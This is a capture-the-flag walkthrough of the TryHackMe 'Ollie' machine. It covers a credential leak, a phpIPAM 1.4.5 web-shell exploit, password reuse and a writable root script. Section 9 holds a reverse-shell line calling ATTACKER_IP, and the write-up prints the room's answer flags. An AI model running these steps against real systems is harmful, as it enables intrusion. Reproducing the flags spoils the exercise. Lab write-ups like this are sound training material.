# Ollie 

**Date:** 24/09/2026 
**Room:** [TryHackMe — Ollie](https://tryhackme.com/room/ollie?utm_source=chatgpt.com)
## 🧭 Introduction

**Ollie** is a Linux-based TryHackMe machine built around a surprisingly unconventional initial foothold.

The attack chain is:

**Custom service → credentials → phpIPAM 1.4.5 → authenticated SQL injection/RCE → `www-data` → password reuse → `ollie` → writable root script → root**

The machine is particularly useful for learning how several individually small weaknesses can be chained together:

- A custom service leaks credentials.
- Those credentials are reused on the web application.
- An outdated phpIPAM installation exposes an authenticated RCE path.
- The same password is reused by the Linux user.
- A root-executed script is writable by that lower-privileged user.

TryHackMe describes Ollie as a machine where the infamous “hacker dog” has modified files for backward compatibility, and the room asks for both `user.txt` and `root.txt`.

---

# 🔍 1. Reconnaissance

I started with a full TCP port scan:

```
nmap -sV -sC -p- -T4 <MACHINE_IP>
```

The scan revealed three open ports:

```
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open  http     Apache httpd 2.4.41
1337/tcp  open  unknown
```

The important thing here is **1337/tcp**.

Port 1337 isn't a standard service such as SSH or HTTP, so instead of immediately running automated enumeration against it, I interacted with it manually.

---

# 🐕 2. Investigating Port 1337

I connected using Netcat:

```
nc <MACHINE_IP> 1337
```

The service presented an interactive series of questions.

One of the questions asked about Ollie's breed, presenting choices including:

```
Bulldog
Husky
Duck
Wolf
```

The correct answer was:

```
Bulldog
```

After answering the questions correctly, the service returned credentials for the web application's administration panel:

```
Username: admin
Password: OllieUnixMontgomery!
```

The important discovery wasn't SSH access — those credentials didn't provide useful SSH access.

Instead, I moved to the HTTP service on port 80.

💡 **Enumeration lesson:** An unknown TCP service deserves manual interaction. Port numbers don't tell you what the application actually does.

---

# 🌐 3. Web Application Enumeration

I opened:

```
http://<MACHINE_IP>/
```

The website presented the login interface for **phpIPAM**, an IP address management application.

After logging in with:

```
Username: admin
Password: OllieUnixMontgomery!
```

I reached the phpIPAM administration interface.

The application identified itself as:

```
phpIPAM 1.4.5
```

This version immediately became interesting because public research and exploit databases document an authenticated RCE vulnerability affecting phpIPAM 1.4.5. ExploitDB identifies the relevant exploit as **EDB-ID 50963**, titled _phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)_.

---

# 💥 4. phpIPAM 1.4.5 — Authenticated SQL Injection → RCE

The vulnerable functionality involves the BGP mapping search functionality.

The important parameter is:

```
subnet
```

The vulnerability allows an authenticated administrator to inject SQL into the application's database query.

The interesting part is that the database functionality can ultimately be abused to write a PHP file to the web server.

That changes the attack from:

```
SQL Injection
```

into:

```
SQL Injection
       ↓
File write
       ↓
PHP web shell
       ↓
Remote Code Execution
```

This is why the vulnerability is much more serious than simply being able to read database information.

Public writeups confirm that phpIPAM 1.4.5 can be exploited to place an `evil.php` web shell in the web root and execute commands through its `cmd` parameter.

I used the public ExploitDB proof of concept:

```
EDB-ID: 50963
```

The exploit was run against the target using the credentials obtained from port 1337.

Conceptually, the command looks like:

```
python3 50963.py \
-url http://<MACHINE_IP> \
-usr admin \
-pwd 'OllieUnixMontgomery!'
```

The exploit successfully authenticated and created:

```
/evil.php
```

The resulting web shell accepts commands through:

```
evil.php?cmd=<command>
```

Testing it with a harmless command such as:

```
id
```

returns a result equivalent to:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So we now have **remote command execution as `www-data`**.

---

# 🐚 5. Getting a Shell as `www-data`

A web shell is useful, but an interactive shell is much easier to work with.

I started a Netcat listener on my attacking machine:

```
nc -lvnp 4444
```

Then used the web shell to execute a reverse-shell payload.

After the connection arrived, I confirmed the account:

```
whoami
```

Output:

```
www-data
```

So the current privilege level was:

```
www-data
```

I then upgraded the basic shell into a more usable TTY:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

And, where supported:

```
export TERM=xterm
```

At this point we have a stable foothold inside the machine.

---

# 👤 6. Lateral Movement to `ollie`

The next objective was to identify local users and determine whether any credentials already discovered could be reused.

One obvious candidate was the password obtained from the custom service:

```
OllieUnixMontgomery!
```

I checked the local users and found:

```
ollie
```

I then attempted to switch accounts:

```
su - ollie
```

Using:

```
OllieUnixMontgomery!
```

The password worked.

That means the same password was being reused for the Linux `ollie` account.

We now have:

```
www-data
   ↓
password reuse
   ↓
ollie
```

This is an important real-world lesson: credentials recovered from one service should be considered candidates for other accounts and services on the same authorized target.

---

# 🏁 7. User Flag

Now operating as:

```
ollie
```

I checked the user's home directory:

```
cd /home/ollie
ls
```

The `user.txt` file was present.

Reading it gives:

```
THM{Ollie_boi_is_daH_Cut3st}
```

🏁 **User Flag**

```
THM{Ollie_boi_is_daH_Cut3st}
```

This matches independent Ollie writeups that report the same user flag.

---

# 👑 8. Privilege Escalation

Now the objective is:

```
ollie → root
```

I first performed standard Linux privilege-escalation enumeration.

A useful tool here is **pspy**, because it can monitor processes being executed without requiring root privileges.

The important discovery was a process repeatedly executing:

```
/bin/bash /usr/bin/feedme
```

with:

```
UID=0
```

In other words, the `feedme` script was being executed as **root**.

This is already interesting.

The next question is:

> Can `ollie` modify `/usr/bin/feedme`?

I checked its permissions:

```
ls -la /usr/bin/feedme
```

The important property is that the `ollie` group has write permission.

The vulnerability is therefore:

```
/usr/bin/feedme
        │
        ├── owned by root
        ├── executed by root
        └── writable by ollie
```

That's a textbook privilege-escalation condition.

Independent walkthroughs confirm that `feedme` is periodically executed with UID 0 while being writable by the `ollie` user/group.

---

# 💣 9. Exploiting the Writable Root Script

Because the script is executed by root, modifying it means that commands added to the script will also execute with root privileges.

For the lab, I appended a reverse-shell command:

```
echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1" >> /usr/bin/feedme
```

I then started a listener on my attacking machine:

```
nc -lvnp 5555
```

The `feedme` script is executed periodically.

When the modified script ran, the reverse shell connected back to the listener.

I checked my privileges:

```
id
```

The result showed:

```
uid=0(root) gid=0(root)
```

We had successfully escalated:

```
www-data
   ↓
ollie
   ↓
writable root script
   ↓
root
```

---

# 🚩 10. Root Flag

With root access, I moved into `/root`:

```
cd /root
ls
```

Then:

```
cat root.txt
```

The room's root flag is:

```
THM{Ollie_Luvs_Chicken_Fries}
```

🏁 **Root Flag**

```
THM{Ollie_Luvs_Chicken_Fries}
```

Independent writeups confirm this root flag.

---

# 🗺️ Complete Attack Chain

The entire machine can be reduced to this:

```
                 OLLIE
                   │
                   ▼
          Nmap: 22 / 80 / 1337
                   │
                   ▼
       Interact with port 1337
                   │
                   ▼
     Answer the Ollie chatbot questions
                   │
                   ▼
       admin : OllieUnixMontgomery!
                   │
                   ▼
          Login to phpIPAM 1.4.5
                   │
                   ▼
    Authenticated SQL Injection / RCE
                   │
                   ▼
             evil.php web shell
                   │
                   ▼
              www-data shell
                   │
                   ▼
          Password reuse discovered
                   │
                   ▼
             su - ollie
                   │
                   ▼
              user.txt
                   │
                   ▼
           Enumerate processes
                   │
                   ▼
       /usr/bin/feedme executed as root
                   │
                   ▼
        feedme writable by ollie
                   │
                   ▼
       Modify feedme with shell command
                   │
                   ▼
                ROOT
                   │
                   ▼
              root.txt
```

---

# 🧠 Lessons Learned

### 1. Don't ignore unusual ports

Port `1337` looked like an unknown service, but it was actually the initial credential-disclosure mechanism.

**Lesson:** interact with unfamiliar services manually before dismissing them.

### 2. Credentials can bridge attack surfaces

The credentials obtained from the custom service weren't useful for SSH, but they worked on the web application.

Then the same password was reused by `ollie`.

```
1337 credentials
       ↓
phpIPAM
       ↓
ollie
```

Credential reuse can turn a seemingly isolated credential leak into an entire attack chain.

### 3. Version enumeration matters

Identifying:

```
phpIPAM 1.4.5
```

was what made vulnerability research possible.

Search results and exploit databases document an authenticated RCE exploit for this version.

### 4. SQL injection can become RCE

The important escalation wasn't merely:

```
SQL injection → database access
```

It was:

```
SQL injection
      ↓
database file-write capability
      ↓
PHP web shell
      ↓
command execution
```

That distinction is important when assessing the real impact of a SQL injection.

### 5. Always examine writable privileged files

The final escalation was incredibly simple.

A root process executed:

```
/usr/bin/feedme
```

while the lower-privileged `ollie` account could modify it.

That creates:

```
attacker-controlled code
          ↓
root executes it
          ↓
root compromise
```

This is why privilege-escalation enumeration should examine **both ownership and write permissions**, not just SUID binaries and `sudo -l`.

---

# 🎯 Conclusion

Ollie is a great example of a **chain rather than a single vulnerability**.

The initial foothold isn't obtained through the most obvious service. Instead, the custom service on port 1337 provides credentials, those credentials unlock phpIPAM, phpIPAM provides RCE, password reuse provides the `ollie` account, and finally a writable root-executed script provides root.

The complete chain is:

> **Custom service → credential leak → phpIPAM RCE → `www-data` → password reuse → `ollie` → writable root script → root**

### 🏆 Flags

**User:**

```
THM{Ollie_boi_is_daH_Cut3st}
```

**Root:**

```
THM{Ollie_Luvs_Chicken_Fries}
```